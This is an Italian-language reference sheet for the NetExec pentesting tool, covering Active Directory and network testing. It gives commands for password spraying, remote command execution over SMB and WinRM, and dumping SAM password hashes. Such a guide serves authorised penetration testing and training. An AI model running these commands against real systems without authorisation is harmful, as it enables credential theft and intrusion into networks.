# NetExec (CrackMapExec) — Network Exploitation Framework

**NetExec** (evoluzione di CrackMapExec) è lo strumento tuttofare per il pentesting di reti, con focus su Active Directory. Supporta SMB, RDP, WinRM, SSH, MSSQL, LDAP.

---

## A cosa serve?

- **Enumerazione rete:** Mappa host, utenti, gruppi, share
- **Password Spraying:** Testa credenziali su larga scala
- **Esecuzione remota:** Comandi via SMB, WinRM, SSH
- **Credential Dumping:** Estrazione hash SAM, LSA

---

## Come usarlo

### Scansione rete SMB

```bash
nxc smb 192.168.1.0/24
```

### Verifica credenziali

```bash
nxc smb 10.129.14.128 -u 'admin' -p 'password'
```

### Elenco share con permessi

```bash
nxc smb 10.129.14.128 -u 'admin' -p 'password' --shares
```

### Esecuzione comandi remoti

```bash
nxc smb 10.129.14.128 -u 'admin' -p 'password' -x 'whoami'
```

### Dump hash SAM

```bash
nxc smb 10.129.14.128 -u 'admin' -p 'password' --sam
```

### RDP / WinRM / SSH / MSSQL

```bash
nxc rdp 192.168.1.0/24 -u 'admin' -p 'password'
nxc winrm 10.129.14.128 -u 'admin' -p 'password' -x 'hostname'
nxc ssh 192.168.1.0/24 -u 'root' -p 'password'
nxc mssql 10.129.14.128 -u 'sa' -p 'password' --query 'SELECT @@version;'
```

> Fonte: https://github.com/Pennyw0rth/NetExec
